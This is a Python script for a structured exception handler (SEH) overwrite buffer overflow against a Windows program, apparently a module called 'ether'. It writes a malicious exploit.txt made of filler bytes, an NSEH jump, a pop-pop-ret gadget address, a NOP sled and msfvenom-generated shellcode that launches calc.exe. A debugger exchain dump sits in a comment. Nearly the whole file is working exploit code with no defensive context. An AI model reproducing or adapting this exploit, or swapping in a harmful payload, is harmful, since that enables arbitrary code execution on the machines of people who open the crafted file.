def main():
    File = "exploit.txt"
    """
    0:000> !exchain
    0019ab7c: ether!decrypt_data+25df (029739ef)
    0019ac54: ether!decrypt_data+2517 (02973927)
    0019b0dc: 42386742 - 984 - SEH
    Invalid exception stack at 37674236 - 980 NSEH

    """
    size = 980
    # Bad Chars - x0d/x00
    # msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0d" -f py -v shellcode EXITFUNC=thread
    shellcode =  b""
    shellcode += b"\xd9\xc8\xd9\x74\x24\xf4\xbe\xc8\xeb\xc4\xd7"
    shellcode += b"\x5f\x33\xc9\xb1\x31\x83\xef\xfc\x31\x77\x14"
    shellcode += b"\x03\x77\xdc\x09\x31\x2b\x34\x4f\xba\xd4\xc4"
    shellcode += b"\x30\x32\x31\xf5\x70\x20\x31\xa5\x40\x22\x17"
    shellcode += b"\x49\x2a\x66\x8c\xda\x5e\xaf\xa3\x6b\xd4\x89"
    shellcode += b"\x8a\x6c\x45\xe9\x8d\xee\x94\x3e\x6e\xcf\x56"
    shellcode += b"\x33\x6f\x08\x8a\xbe\x3d\xc1\xc0\x6d\xd2\x66"
    shellcode += b"\x9c\xad\x59\x34\x30\xb6\xbe\x8c\x33\x97\x10"
    shellcode += b"\x87\x6d\x37\x92\x44\x06\x7e\x8c\x89\x23\xc8"
    shellcode += b"\x27\x79\xdf\xcb\xe1\xb0\x20\x67\xcc\x7d\xd3"
    shellcode += b"\x79\x08\xb9\x0c\x0c\x60\xba\xb1\x17\xb7\xc1"
    shellcode += b"\x6d\x9d\x2c\x61\xe5\x05\x89\x90\x2a\xd3\x5a"
    shellcode += b"\x9e\x87\x97\x05\x82\x16\x7b\x3e\xbe\x93\x7a"
    shellcode += b"\x91\x37\xe7\x58\x35\x1c\xb3\xc1\x6c\xf8\x12"
    shellcode += b"\xfd\x6f\xa3\xcb\x5b\xfb\x49\x1f\xd6\xa6\x07"
    shellcode += b"\xde\x64\xdd\x65\xe0\x76\xde\xd9\x89\x47\x55"
    shellcode += b"\xb6\xce\x57\xbc\xf3\x31\xba\x15\x09\xda\x63"
    shellcode += b"\xfc\xb0\x87\x93\x2a\xf6\xb1\x17\xdf\x86\x45"
    shellcode += b"\x07\xaa\x83\x02\x8f\x46\xf9\x1b\x7a\x69\xae"
    shellcode += b"\x1c\xaf\x0a\x31\x8f\x33\xe3\xd4\x37\xd1\xfb"
    nopsled = b"\x90" * 200
    inputBuffer = b"\x41" * size
    inputBuffer+= b"\xEB\x09\x90\x90" # NSEH 09eb9090 - jmp to shellcode
    inputBuffer+= b"\x39\x56\x03\x10" # 0x10035639 - SEH - pop eax; pop ebp; ret
    inputBuffer+= nopsled
    inputBuffer+= shellcode

    with open(File, "wb") as exploit:
        exploit.write(inputBuffer) 
        print("Buffer written")
if __name__ == '__main__':
    main()